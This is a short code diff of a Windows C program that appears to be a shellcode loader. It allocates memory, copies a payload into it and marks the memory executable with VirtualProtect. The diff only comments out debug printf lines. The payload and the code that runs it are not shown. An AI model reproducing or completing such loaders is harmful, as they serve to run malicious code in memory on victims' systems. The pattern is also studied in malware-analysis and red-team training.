@@ -21,8 +21,8 @@ int main(void) {
 
 	//Allocate a memory buffer for payload
 	exec_mem = VirtualAlloc(0, payload_len, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
-	printf("%x addr of payload\n", &payload);
-	printf("%x exec memory address\n", exec_mem);
+	//printf("%x addr of payload\n", &payload);
+	//printf("%x exec memory address\n", exec_mem);
 
 	//copy memory to buffer
 	RtlMoveMemory(exec_mem, payload, payload_len);
@@ -30,7 +30,7 @@ int main(void) {
 	// make a new buffer as executable
 	rv = VirtualProtect(exec_mem, payload_len, PAGE_EXECUTE_READ, &oldprotect);
 
-	printf("\nHit me!\n");
+	//printf("\nHit me!\n");
 	getchar();
 
 	if (rv != 0) {
